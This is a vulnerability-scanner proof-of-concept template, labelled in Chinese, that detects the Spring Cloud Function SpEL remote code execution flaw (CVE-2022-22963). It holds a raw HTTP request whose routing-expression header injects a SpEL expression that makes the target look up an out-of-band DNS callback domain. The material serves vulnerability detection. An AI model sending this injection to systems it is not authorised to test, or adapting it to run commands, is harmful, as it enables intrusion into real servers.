id: poc-yaml-spring-cloud-function-spel-rce
info:
  name: Spring Cloud Function Spel 远程命令执行漏洞(CVE-2022-22963)
  severity: critical
  tags:
  - DNSLOG
  - 两高一弱
  - rce
  - CVE-2022-22963
  finger: spring
variables:
  reverse: new_dns_log()
  reverseDomain: reverse.Domain()
requests:
- rawTCP: 'POST /functionRouter HTTP/1.1

    Host: {{.host}}

    Content-Type: text/plain

    spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("{{.reverseDomain}}")


    test'
  expression: status_code == 500 && reverse.Verify()
transport: tcp
